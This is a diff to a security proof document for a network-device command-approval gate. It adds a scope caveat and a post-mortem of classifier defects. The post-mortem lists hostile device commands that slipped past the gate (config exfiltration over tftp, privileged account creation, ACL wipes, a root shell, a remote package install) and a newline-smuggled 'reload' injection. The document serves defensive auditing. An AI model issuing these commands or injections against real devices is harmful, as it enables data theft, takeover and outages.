@@ -1,5 +1,14 @@
 # Live Proof — Approval Flow & Error-Observation Typing (2026-07-23)
 
+> **SCOPE: CISCO IOS ONLY.** Every claim in this document was exercised
+> against one driver (`cisco_ios`, R1, a GNS3 C7200) using
+> **single-command** submissions. It establishes nothing about ASA,
+> PAN-OS, JunOS or FortiGate, and nothing about multi-command input.
+> Cisco was, at the time of this run, the *only* driver whose classifier
+> failed closed — so this run exercised the best case and generalised
+> from it. See "What this run did not cover" below for what was later
+> found on the other four.
+
 Status: live run complete. Evidence below is verbatim from the CT 211
 daemon journal (`journalctl -u virp-onode --utc`) and the live trust
 chain (`/var/lib/virp/chain.db`, read read-only), captured on this host
@@ -166,6 +175,47 @@ through the deployed daemon, plus the checked-in suite named per row.
   the 300 s window — the boundary region (300–430 s) is untested live;
   the suite's `test_expired_approval_rejected` covers TTL+100 s with a
   crafted timestamp, not a boundary sweep.
+
+## What this run did not cover (added 2026-07-28)
+
+This proof was read for two months as evidence about "the gate". It is
+evidence about the Cisco gate, on single commands. Three defects found
+afterwards were all outside its reach:
+
+**1. The other four drivers defaulted unrecognized commands to YELLOW.**
+Cisco's classifier failed closed to RED for anything unlisted. ASA,
+PAN-OS, JunOS and FortiGate returned **YELLOW**, which clears the default
+YELLOW gate threshold — so an unrecognized command *executed*, under
+ENFORCE, with a signed observation recording it as a routine YELLOW
+operation. Fixed in `e8f1c95`. What that meant in practice, measured
+against the pre-fix classifiers:
+
+| Driver | Command | Pre-fix tier | Effect |
+|---|---|---|---|
+| ASA | `copy running-config tftp://10.0.0.9/cfg` | YELLOW → executed | full config exfiltration |
+| ASA | `username admin password Str0ng privilege 15` | YELLOW → executed | privileged account creation |
+| ASA | `clear configure access-list` | YELLOW → executed | ACL wipe |
+| PAN-OS | `commit` | YELLOW → executed | applies the entire candidate config |
+| PAN-OS | `delete rulebase security rules TRUST-ANY` | YELLOW → executed | firewall rule deletion |
+| PAN-OS | `set deviceconfig system permitted-ip 0.0.0.0` | YELLOW → executed | opens mgmt plane to the world |
+| PAN-OS | `request restart system` | YELLOW → executed | firewall reboot |
+| JunOS | `start shell` | YELLOW → executed | drops to a root shell |
+| JunOS | `request system software add http://<url>` | YELLOW → executed | arbitrary package install |
+| FortiGate | `set password ABC123` | YELLOW → executed | credential write |
+
+Note the asymmetry that hid this: JunOS `request system software delete`
+was correctly BLACK while `request system software add <url>` fell to the
+default and ran.
+
+**2. Multi-command injection was never submitted.** Every classifier
+prefix-matched from index 0 while the drivers sent the whole string to
+the device, so `"show version\nreload"` classified GREEN on its first
+line and the `reload` reached the wire ungated. Closed in `b3985e1`
+(daemon boundary + Cisco classifier) and `19c0054` (remaining four).
+
+**3. Juniper shipped a multi-command splitter.** `junos_execute` split on
+`;` and `\n` and ran each sub-command in one PTY session, having been
+classified once on its first token. Deleted in `0a0d75b`.
 
 ## Findings from live testing (deferred — fix directions only)
 
